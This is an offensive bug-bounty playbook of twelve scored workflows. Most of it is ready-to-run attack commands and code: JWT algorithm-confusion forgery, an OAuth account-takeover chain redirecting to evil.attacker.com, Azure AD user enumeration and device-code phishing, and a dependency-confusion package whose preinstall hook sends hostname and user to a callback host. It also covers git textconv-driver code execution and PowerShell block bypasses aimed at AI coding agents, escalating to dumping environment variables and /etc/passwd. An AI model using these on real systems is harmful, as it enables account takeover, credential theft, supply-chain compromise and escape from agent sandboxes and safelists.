# Workflows — No Mercy Hunter v3.0

All workflows scored: Composite = (Confidence x 2) + (InformationGain x 3) + (AutomationPotential x 2) + (Reusability x 2) - Cost
Maximum = 50.

---

## WF-01 — Full Passive Recon Pipeline

Score: (4x2) + (5x3) + (5x2) + (5x2) - 2 = **41**
Confidence: 4 | InfoGain: 5 | AutoPot: 5 | Reuse: 5 | Cost: 2

When to run: Every engagement. First action before any active probing.

Prerequisites: Target domain confirmed in scope. Output directory created.

Steps:

1. Certificate Transparency
   curl -s "https://crt.sh/?q=%25.TARGET&output=json" | jq -r ".[].name_value" | sort -u > subs/crt.txt

2. Run recon.sh (full pipeline)
   bash scripts/recon.sh TARGET ../recon/TARGET
   This runs: subfinder, assetfinder, amass, findomain, dnsx, httpx, naabu, gau, waybackurls, katana, nuclei

3. Source map detection from URL history
   grep -E "\.map|sourceMappingURL" urls/all.txt > urls/source-maps.txt
   Fetch each .map file and extract: API paths, secrets, internal hostnames

4. Codename fuzzing (300 URLs)
   python shadow_hunter.py  [Tab 1: Codename Fuzzer]
   20 codenames x 15 path patterns = 300 candidate URLs

5. JS file endpoint extraction
   grep -E "\.js" urls/all.txt | sort -u > urls/js-files.txt
   For each JS file, extract quoted paths starting with /

6. GitHub code search for leaked credentials
   mcp__github__search_code: query="TARGET api_key OR secret OR password"

Output files: subs/all.txt, live/hosts.txt, urls/all.txt, sourcemaps/, js/internal-paths.txt

---

## WF-02 — Shadow API Discovery

Score: (4x2) + (5x3) + (4x2) + (5x2) - 3 = **40**
Confidence: 4 | InfoGain: 5 | AutoPot: 4 | Reuse: 5 | Cost: 3

When to run: After WF-01 produces live host list. Especially valuable for AI platforms.

Steps:

1. Launch shadow_hunter.py
   Tab 1: Codename Fuzzer — probe all 20 codenames as subdomains
   Tab 2: Shadow APIs — probe admin API, GPT catalog, memory, staging, forgotten WS paths

2. Codename subdomain list (probe each as CODENAME.TARGET):
   cortex-admin-gql, auth-triton-v2, realtime-aries, browser-hermes,
   assistant-hub-nest, openai-ml-ops, deepmind-trainer, phoenix-admin-api,
   gizmo-catalog-v3, memory-fabric, vector-pine, chatgpt-staging-omega,
   live-agent-socket, action-oauth-gateway, npm-openai-internal, logs-kibana-2026,
   chat-embed-frame, billing-promo-engine, frontend-next-2026, model-artifacts-prod

3. Path grid against every live host (probe each path):
   /api  /v1  /v2  /v3  /api/v1  /api/v2  /internal  /admin  /ops  /debug
   /config  /health  /status  /metrics  /graphql  /ws  /oauth  /schema
   /openapi.json  /swagger.json  /catalog  /registry  /bootstrap  /k8s-bootstrap
   Filter results: keep anything NOT returning 404

4. Admin endpoint detection via ffuf
   ffuf -w wordlists/content/api-endpoints.txt -u HOST/FUZZ -mc 200,201,301,302,401,403 -o shadow/admin-endpoints.json

5. Unreleased model slug enumeration (AI platforms)
   Test each of these as the "model" field in POST /v1/chat/completions:
   gpt-5, gpt-5-turbo, gpt-5-mini, gpt-next, o3, o3-mini, o4, o4-mini,
   gpt-5-realtime, gpt-5-audio, gpt-4-turbo-next, gpt-4o-advanced
   HTTP 404 with model-not-found = exists but not enabled (information)
   HTTP 200 = exposed unreleased model (F-03 pattern = P4)

Output: shadow/path-grid.txt, shadow/admin-endpoints.json, shadow/model-slugs.txt

---

## WF-03 — JWT Algorithm Confusion

Score: (5x2) + (4x3) + (3x2) + (4x2) - 3 = **31**
Confidence: 5 | InfoGain: 4 | AutoPot: 3 | Reuse: 4 | Cost: 3

When to run: JWT with alg=RS256 or ES256 confirmed in captured traffic.

Steps:

1. Decode JWT header to confirm algorithm:
   [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("HEADER_PART=="))

2. Fetch JWKS endpoint:
   JWKS_URL from /.well-known/openid-configuration -> jwks_uri field
   curl -s JWKS_URL > auth/jwks.json

3. Extract RSA public key from JWKS:
   Parse keys[0] n and e values (base64url-encoded)
   Use Python cryptography library: RSAPublicNumbers(e, n).public_key() -> export PEM
   Save to auth/pubkey.pem

4. Forge HS256 token using pubkey as HMAC secret:
   import jwt
   payload = {copy original claims, optionally escalate role to "admin"}
   forged = jwt.encode(payload, open("auth/pubkey.pem","rb").read(), algorithm="HS256")

5. Test forged token against endpoints:
   curl -H "Authorization: Bearer FORGED_TOKEN" TARGET/api/v1/users/me
   curl -H "Authorization: Bearer FORGED_TOKEN" TARGET/api/v1/admin/users
   Look for: 200 OK (bypass confirmed), 403 (token accepted but insufficient perms), 401 (bypass failed)

6. Test none algorithm:
   Construct: base64url({"alg":"none","typ":"JWT"}).base64url(payload).
   Send with trailing dot and empty signature segment

Output: auth/jwks.json, auth/pubkey.pem, auth/forged-tokens.txt

---

## WF-04 — GraphQL Full Enumeration

Score: (4x2) + (5x3) + (4x2) + (5x2) - 2 = **43**
Confidence: 4 | InfoGain: 5 | AutoPot: 4 | Reuse: 5 | Cost: 2

When to run: GraphQL endpoint found at /graphql, /api/graphql, /query, or /gql.

Steps:

1. Fingerprint GraphQL engine:
   graphw00f -t TARGET/graphql -o graphql/engine.txt
   Identifies: Apollo, Hasura, AWS AppSync, GraphQL.js, Strawberry, Ariadne, etc.

2. Full introspection query:
   POST /graphql Content-Type: application/json
   Body: {"query":"{__schema{types{name fields{name args{name type{name kind ofType{name kind}}}}}}}"}
   Save full schema to graphql/schema.json

3. If introspection disabled — use field suggestion:
   clairvoyance TARGET/graphql -H "Authorization: Bearer TOKEN" -o graphql/clairvoyance-schema.json
   Also try: send query with typo, check if error message suggests correct field name

4. Full schema dump with InQL:
   python -m inql -t TARGET/graphql --generate-html -o graphql/inql/

5. Batching test (check if rate limits apply per-request or per-operation):
   POST /graphql with array: [{"query":"query{me{id}}"}, ...repeat 10x...]
   If all 10 return data -> batching enabled, rate limit bypassed

6. Alias amplification for rate limit bypass:
   POST {"query":"{a:user(id:1){id email} b:user(id:2){id email} c:user(id:3){id email}}"}
   10 aliases in one request = 10 operations counted as 1 request

7. Cross-account IDOR via GraphQL query parameters:
   Authenticate as Account B, query user(id: ACCOUNT_A_ID)
   Also test: node(id: GLOBAL_ID), viewer { ... }

8. Automated security checks:
   graphql-cop -t TARGET/graphql -H "Authorization: Bearer TOKEN" -o graphql/cop-results.json

9. Nested query DoS test (confirm scope allows active testing):
   {"query":"{users{friends{friends{friends{id}}}}}"}
   Measure response time. >30s = DoS candidate.

Output: graphql/schema.json, graphql/inql/, graphql/cop-results.json, graphql/idor-results.json

---

## WF-05 — OAuth Client Registration Test

Score: (5x2) + (5x3) + (4x2) + (5x2) - 2 = **45**
Confidence: 5 | InfoGain: 5 | AutoPot: 4 | Reuse: 5 | Cost: 2

When to run: Any OAuth endpoint discovered. Priority target on every engagement.

Steps:

1. Discover registration endpoint:
   Check /.well-known/openid-configuration for "registration_endpoint" field
   Also probe manually:
   /oauth/register, /oauth/clients, /api/oauth/register, /v1/oauth/clients,
   /oauth/applications, /connect/register, /api/v1/oauth/clients

2. Test unauthenticated RFC 7591 dynamic client registration:
   POST /oauth/register  (no Authorization header)
   Content-Type: application/json
   Body: {
     "client_name": "test-xxxxxxxx",
     "redirect_uris": ["https://evil.attacker.com/callback"],
     "grant_types": ["authorization_code"],
     "response_types": ["code"],
     "scope": "openid profile email"
   }
   If HTTP 201 returned with client_id + client_secret -> CRITICAL finding (HF-01 pattern)

3. Confirm arbitrary redirect_uri is accepted:
   Build authorization URL:
   /oauth/authorize?client_id=EVIL_CLIENT_ID&redirect_uri=https://evil.attacker.com/callback&response_type=code&scope=openid+profile&state=xyz
   Confirm: does the server accept evil.com as redirect_uri? (does not show "invalid redirect_uri" error)

4. Test device code grant:
   POST /oauth/token
   grant_type=urn:ietf:params:oauth:grant-type:device_code&client_id=EVIL_CLIENT_ID&device_code=test

5. Test ROPC (password grant):
   POST /oauth/token
   grant_type=password&client_id=EVIL_CLIENT_ID&username=victim@example.com&password=test

6. Document full ATO chain for P1 report:
   Step 1: Attacker POSTs to /oauth/register (no auth) -> gets evil client_id
   Step 2: Attacker generates authorization URL with evil.com redirect_uri
   Step 3: Victim clicks link, authenticates with their credentials
   Step 4: Authorization code delivered to attacker at evil.attacker.com/callback
   Step 5: Attacker POSTs code to /oauth/token -> receives victim access_token + refresh_token
   Step 6: Attacker uses tokens to access victim account -> full ATO

Output: oauth/registered-client.json, oauth/auth-url.txt, oauth/ato-chain.md

---

## WF-06 — Azure AD Tenant Recon

Score: (5x2) + (5x3) + (4x2) + (4x2) - 3 = **38**
Confidence: 5 | InfoGain: 5 | AutoPot: 4 | Reuse: 4 | Cost: 3

When to run: staging.*, dev.*, or corporate subdomain found. Microsoft login redirect observed.

Quick steps:
1. Probe OpenID configuration:
   curl -s "https://login.microsoftonline.com/TARGET_DOMAIN/v2.0/.well-known/openid-configuration"

2. Extract tenant_id from issuer: "https://sts.windows.net/TENANT_ID/"

3. Check grant_types_supported list for:
   - "password" -> ROPC enabled (password spray possible)
   - "urn:ietf:params:oauth:grant-type:device_code" -> device code phishing possible

4. If ROPC enabled: attempt user enumeration via login error differentiation
   POST https://login.microsoftonline.com/TENANT_ID/oauth2/v2.0/token
   grant_type=password&client_id=CLIENT_ID&username=USER@DOMAIN&password=wrong
   Error "AADSTS50034" = user does not exist
   Error "AADSTS50126" = user exists, wrong password

5. If device code enabled: generate phishing device code
   POST https://login.microsoftonline.com/TENANT_ID/oauth2/v2.0/devicecode
   Receive: user_code + device_code + verification_uri
   Send verification_uri + user_code to victim

See playbooks/pb-06-azure-ad-recon.md for full procedure.
Output: azuread/tenant-config.json, azuread/grant-types.txt, azuread/users.txt

---

## WF-07 — PowerShell AST Block Enumeration

Score: (5x2) + (4x3) + (3x2) + (4x2) - 2 = **32**
Confidence: 5 | InfoGain: 4 | AutoPot: 3 | Reuse: 4 | Cost: 2

When to run: System executes or analyzes PowerShell code (Codex, AI coding agents, CI/CD).

AST block test sequence — test each with Write-Output "BLOCK_BYPASSED" first:

Block 1 (CODEX-01 pattern):
  begin { Write-Output "begin block executed" } process {} end {}

Block 2 (CODEX-02 pattern):
  trap { Write-Output "trap executed" }; throw "trigger"

Block 3 (CODEX-03 pattern — pwsh 7.3+ only):
  clean { Write-Output "clean block executed" }

Block 4:
  filter f { Write-Output "filter executed" }; f

Block 5:
  using namespace System; [Console]::WriteLine("namespace import executed")

Block 6:
  class C { static [void] M() { Write-Output "class method executed" } }; [C]::M()

Block 7 (PS 5.x only):
  workflow w { Write-Output "workflow executed" }; w

Block 8 (DSC):
  configuration c { Write-Output "DSC config executed" }; c

Block 9:
  #requires -Version 5
  Write-Output "requires executed"

Block 10:
  param([string]$x = "default-payload"); Write-Output $x

Escalation: once bypass confirmed, replace Write-Output with:
  whoami; $env:USERNAME; Get-ChildItem Env: | Select-Object Name,Value; cat /etc/passwd

Output: powershell/ast-block-results.txt

---

## WF-08 — Git Config Driver RCE Test

Score: (5x2) + (5x3) + (3x2) + (4x2) - 3 = **32**
Confidence: 5 | InfoGain: 5 | AutoPot: 3 | Reuse: 4 | Cost: 3

When to run: System auto-approves git diff, git log, git show, or git status.

Steps:

1. Create .gitattributes file:
   *.txt diff=spy
   *.py diff=spy
   *.md diff=spy

2. Inject textconv driver into .git/config:
   [diff "spy"]
       textconv = sh -c "id > /tmp/pwned_$(date +%s); cat $1" --

3. Create and stage a tracked file:
   echo "test content" > test.txt
   git add test.txt

4. Wait for system to run: git diff HEAD  OR  git log -p  OR  git show HEAD

5. Confirm RCE: check if /tmp/pwned_* file was created

6. Test external-diff variant:
   [diff]
       external = /path/to/evil-script

7. Test merge driver:
   [merge "spy"]
       driver = /path/to/evil-script %O %A %B

8. Test filter driver (triggered on git checkout):
   [filter "spy"]
       clean = /path/to/evil-script
       smudge = /path/to/evil-script

Key insight: git CLI flags like --no-ext-diff only block external diffs, not textconv.
A "read-only" safelist that permits git diff but blocks git checkout is still exploitable.

Output: poc/git-driver-rce.sh, evidence/git-driver-execution.png

---

## WF-09 — AI Memory IDOR

Score: (4x2) + (5x3) + (4x2) + (5x2) - 2 = **43**
Confidence: 4 | InfoGain: 5 | AutoPot: 4 | Reuse: 5 | Cost: 2

When to run: AI platform with persistent memory API (/v1/memories, /memories, /context).

Steps:

1. Authenticate as Account A. Create a memory item:
   POST /v1/memories
   Authorization: Bearer TOKEN_A
   Body: {"content": "IDOR test marker - account A - unique string xyz789"}
   Save returned id to memory/account-a-id.txt

2. From Account B, attempt cross-account read:
   GET /v1/memories/ACCOUNT_A_ID
   Authorization: Bearer TOKEN_B
   Expected: 403 or 404. If 200 -> IDOR read confirmed (P2)

3. From Account B, attempt cross-account write:
   PATCH /v1/memories/ACCOUNT_A_ID
   Authorization: Bearer TOKEN_B
   Body: {"content": "POISONED by Account B"}
   If 200 -> IDOR write confirmed (P1 - memory poisoning across accounts)

4. From Account B, attempt cross-account delete:
   DELETE /v1/memories/ACCOUNT_A_ID
   Authorization: Bearer TOKEN_B
   If 200/204 -> IDOR delete confirmed (P1)

5. Sequential ID enumeration:
   For IDs from BASE to BASE+100, GET /v1/memories/ID with Account B token
   Record all non-404 responses. Each 200 = another user's memory exposed.

6. UUID prediction (if UUIDs used):
   Collect 5+ memory IDs from Account A
   Check for patterns: sequential time component, predictable random seed

Output: memory/idor-results.txt, memory/cross-account-read.json, memory/sequential-enum.txt

---

## WF-10 — Race Condition

Score: (4x2) + (4x3) + (4x2) + (4x2) - 3 = **33**
Confidence: 4 | InfoGain: 4 | AutoPot: 4 | Reuse: 4 | Cost: 3

When to run: Endpoints handling credits, coupons, limits, free tiers, single-use tokens.

Python thread-barrier implementation (scripts/race-condition.py):

    import threading, requests, json

    TARGET   = "https://target.com/api/v1/coupon/redeem"
    TOKEN    = "Bearer YOUR_TOKEN_HERE"
    PAYLOAD  = {"code": "PROMO50OFF"}
    N        = 20

    barrier = threading.Barrier(N)
    results = []
    lock    = threading.Lock()

    def attempt():
        barrier.wait()  # synchronize — all threads fire simultaneously
        r = requests.post(TARGET,
            headers={"Authorization": TOKEN, "Content-Type": "application/json"},
            json=PAYLOAD, timeout=10)
        with lock:
            results.append({"status": r.status_code, "body": r.text[:200]})

    threads = [threading.Thread(target=attempt) for _ in range(N)]
    [t.start() for t in threads]
    [t.join() for t in threads]

    successes = [r for r in results if r["status"] == 200]
    print(f"Total: {N} | Successes: {len(successes)}")
    for r in successes:
        print(json.dumps(r))

Interpretation:
  1 success  -> properly rate-limited
  >1 success -> race condition confirmed, report as P2
  N successes -> full race condition, no server-side locking, report as P2+

Output: race/results.json, race/thread-barrier-poc.py

---

## WF-11 — Dependency Confusion

Score: (3x2) + (4x3) + (4x2) + (4x2) - 2 = **34**
Confidence: 3 | InfoGain: 4 | AutoPot: 4 | Reuse: 4 | Cost: 2

When to run: Target uses npm or PyPI. Internal package names visible in source maps or JS bundles.

Steps:

1. Extract internal package names from source maps:
   grep -rE '"name":' sourcemaps/ | grep -E "@[a-z]+-internal|private|internal"
   Also scan package.json files recovered from source maps

2. Check public availability of each internal package name:
   curl -s -o /dev/null -w "%{http_code}" https://registry.npmjs.org/PACKAGE_NAME
   404 = unclaimed on npm (confusion candidate)

3. For unclaimed names: create confusion package
   package.json:
     { "name": "@target-internal/package-name", "version": "99.0.0",
       "scripts": { "preinstall": "curl https://YOUR_CALLBACK/$(hostname)/$(whoami)" } }
   npm publish --access public

4. For PyPI: same approach
   setup.py with install_requires callback in setup() or __init__.py import hook
   pip publish to PyPI

5. Monitor callback server for hits
   Any hit = confirmed dependency confusion (target server installed your package)
   Capture: hostname, username, IP address from callback

Output: supply/internal-pkgs.txt, supply/unclaimed-names.txt, supply/published-packages.txt

---

## WF-12 — Source Map and JS Recon

Score: (4x2) + (5x3) + (5x2) + (5x2) - 1 = **48** — Highest information gain per request
Confidence: 4 | InfoGain: 5 | AutoPot: 5 | Reuse: 5 | Cost: 1

When to run: First action on any web target with JavaScript bundles. Before any active probing.

Steps:

1. Collect all JS bundle URLs from main page HTML:
   GET TARGET/ and extract all src="*.js" attributes

2. Check each JS file for sourceMappingURL comment at end of file:
   curl -s JS_URL | tail -c 200 | grep sourceMappingURL

3. Try appending .map to each JS URL directly:
   curl -s -o /dev/null -w "%{http_code}" JS_URL.map
   If 200 -> download: curl -s JS_URL.map -o js/maps/bundle.js.map

4. Also check URLs from gau/wayback history for .map files:
   grep "\.map" urls/all.txt | httpx -silent -status-code

5. Extract secrets from downloaded map files:
   Pattern match for: api_key, apikey, secret, password, token, bearer,
   private_key, aws_access_key_id, sk-[a-zA-Z0-9]{40+}, AIza[a-zA-Z0-9_-]{35}

6. Extract internal API paths:
   Grep all source files inside maps for quoted strings starting with /
   Filter out: /node_modules, /src, relative paths
   Keep: /api/*, /v1/*, /internal/*, /admin/*, /oauth/*

7. Extract internal hostnames and URLs:
   Grep for https?://[a-zA-Z0-9.-]+ patterns
   Filter out: known CDN domains, public APIs
   Flag: internal.*, staging.*, dev.*, *.internal, 10.x.x.x, 192.168.x.x

8. Extract developer email addresses and names from source comments:
   Grep for @TARGET_DOMAIN in comments
   These can be used for Azure AD user enumeration

Output: js/maps/, js/potential-secrets.txt, js/internal-paths.txt, js/internal-urls.txt, js/dev-emails.txt
